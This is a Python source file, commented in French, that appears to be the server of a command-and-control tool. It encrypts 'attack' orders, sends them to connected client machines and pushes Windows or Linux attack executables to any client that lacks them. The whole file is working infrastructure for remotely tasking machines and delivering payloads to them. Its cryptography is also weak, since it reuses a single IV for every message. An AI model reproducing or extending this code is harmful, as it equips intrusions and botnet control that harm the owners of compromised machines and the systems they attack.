import json
import argparse
import os
import mysql.connector
import json
import socket
import select
import threading
import rsa
import base64

from env import *
from database import *
from network import *
from functions import *
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from queue import Queue, Empty


def format_attack_data(type, id, data):

    json_data = json.loads('{"id":"'+str(id)+'","attack":"'+type+'","arg1":"stealth,t5","arg2":"nono","arg3":""}')


    print("\t\t(+) data : " + str(data))
    json_data.update(data)

    print("\t\t(+) data formed as json")

    return json_data



def execute_attack(client, attack):
    print("\t[+] sending attack to " + str(client['addr']))
    # print(client)
    # print(attack)

    # Récupération des données de l'attaque
    print("\t[+] data de l'attack : " + str(attack))
    attack_data = json.loads(attack[4])
    attack_type = attack[2]
    attack_id = attack[0]

    data_to_send = format_attack_data(attack_type, attack_id, attack_data)

    # Envoi de l'attaque à l'ordinateur
    cipher_enc = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
    cipher_text = cipher_enc.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))

    client['emission_queue'].put(cipher_text)

    print("\t[+] instruction envoyée")

    # reception du message retourner par le client 
    try :
        cipher_dec = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
        encrypted_data_received = client['reception_queue'].get(timeout=10)
        pt = unpad(cipher_dec.decrypt(encrypted_data_received), AES.block_size).decode('utf-8')

        if pt == "YES":
            # le client à l'exécutable
            print("\t[+] Le client à déja l'exécutable")
        else:
            # envoyer l'exécutable 
            print("\t[!] Le client n'a pas l'exécutable")
            attack_type = attack[2]
            #Récupérer os du client 
            if client['os'] == "windows":
                executable_path = 'actions/windows/' + attack_type + '.exe'
            else:
                executable_path = 'actions/linux/' + attack_type

            if os.path.isfile(executable_path):
                with open(executable_path, 'rb') as f:
                    executable_data = f.read()
                
                # Chiffrer l'exécutable
                cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
                file_encrypted = cipher.encrypt(pad(executable_data, AES.block_size))


                # Envois de la taille
                len_file_encrypted = len(file_encrypted)
                print("\t[+] Envoi de la taille de l'executable :", len_file_encrypted)

                cipher_file_size= AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
                file_size_encrypted = cipher_file_size.encrypt(pad(str(len_file_encrypted).encode(), AES.block_size))
                client['emission_queue'].put(file_size_encrypted)


                # Réception de la taille de l'éxécutable reçu par le client
                encrypted_data_received = client['reception_queue'].get(timeout=3)
                
                cipher_len_buffer= AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
                decrypt_size = unpad(cipher_len_buffer.decrypt(encrypted_data_received), AES.block_size).decode('utf-8')

                print("\t[+] Reception de la taille :", decrypt_size)

                # Compare si la taille de l'éxécutable envoyé à bien était reçu par le client
                if int(len_file_encrypted) == int(decrypt_size) :
                    client['emission_queue'].put(file_encrypted)
                    print("\t[+] L'exécutable a été envoyé")
                else:
                    print("Les tailles ne correspondent pas.")
                                
            else:
                print("\t[!] L'exécutable n'a pas été trouvé sur le serveur")
    except Empty:
        print("\t[!] Le client n'a pas répondu")
        pass

    
    # Recevoir le status final de l'envoi de l'exécutable
    # encrypted_final_status = client['reception_queue'].get()
    # final_status = unpad(cipher.decrypt(encrypted_final_status), AES.block_size).decode('utf-8')
    # print(f"Statu final de l'attaque sur le client {client['addr']}: {final_status}")